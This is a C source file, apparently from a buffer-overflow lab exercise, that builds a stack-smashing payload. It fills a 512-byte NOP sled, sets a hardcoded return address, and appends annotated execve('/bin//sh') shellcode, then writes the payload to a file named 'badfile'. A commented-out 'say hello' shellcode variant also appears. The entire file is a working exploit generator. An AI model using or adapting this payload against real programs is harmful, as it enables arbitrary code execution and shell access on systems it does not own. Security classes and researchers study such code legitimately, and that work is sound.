#include <stdlib.h>
#include <stdio.h>
#include <string.h>

//const char shellcode[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd"\
       "\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f"; // Say Hello

const char shellcode[] = \
"\x31\xc0"         /* Line 1:  xorl    %eax,%eax 	*/ 	\
"\x50"             /* Line 2:  pushl   %eax 		*/ 	\
"\x68""//sh"       /* Line 3:  pushl   $0x68732f2f 	*/ 	\
"\x68""/bin"       /* Line 4:  pushl   $0x6e69622f 	*/ 	\
"\x89\xe3"         /* Line 5:  movl    %esp,%ebx 	*/      \
"\x50"             /* Line 6:  pushl   %eax 		*/ 	\
"\x53"             /* Line 7:  pushl   %ebx 		*/	\
"\x89\xe1"         /* Line 8:  movl    %esp,%ecx 	*/	\
"\x99"             /* Line 9:  cdql 			*/	\
"\xb0\x0b"         /* Line 10: movb    $0x0b,%al 	*/	\
"\xcd\x80"         /* Line 11: int     $0x80 		*/	\
;


int main(int argc, char ** argv) {
	char buffer[512];

	FILE *badfile;

	/* Init the buffer with nop (0x90) */
	memset(buffer, 0x90, 512);

	
	buffer[27] = 0xbf;
	buffer[26] = 0xff;
	buffer[25] = 0xf2;
	buffer[24] = 0xff;
	
	// memset(buffer + 28, 0x90, 228);

	strcpy(buffer + 475, shellcode);

	// memset(buffer + 200, 0xCC, 312);	

	/* Save to badfile. */
	badfile = fopen("badfile", "w+");
	fwrite(buffer, 512, 1, badfile);
	fclose(badfile);

	printf("Completed writing\n");

	return 0;
}
